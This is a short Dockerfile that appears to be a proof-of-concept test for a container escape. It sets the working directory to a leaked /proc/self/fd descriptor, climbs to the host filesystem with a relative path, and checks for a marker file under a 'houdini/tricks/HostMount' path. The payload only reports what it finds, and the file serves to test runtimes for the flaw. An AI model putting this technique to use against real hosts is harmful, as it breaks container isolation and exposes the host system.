FROM ubuntu:16.04

WORKDIR /proc/self/fd/5

# Copy the script
COPY host_mount.sh /host_mount.sh

# Set the CMD to run the inline Bash script
CMD bash -c '\
  relative_path="../../../../../"; \
  target_file="houdini/tricks/HostMount/61240abcc5412ab41c9a4c44be7e898666c8bb9c650bf8985b8ae2ee8d4160ce"; \
  if cd "$relative_path" 2>/dev/null; then \
    echo "Successfully changed directory to: $(pwd)"; \
    if [ -f "$target_file" ]; then \
      echo "File found: $target_file"; \
    else \
      echo "File not found: $target_file"; \
    fi; \
  else \
    err_code=$?; \
    case $err_code in \
      1) echo "Error: Permission denied" ;; \
      2) echo "Error: No such file or directory" ;; \
      *) echo "Unexpected error (exit code $err_code)" ;; \
    esac; \
  fi'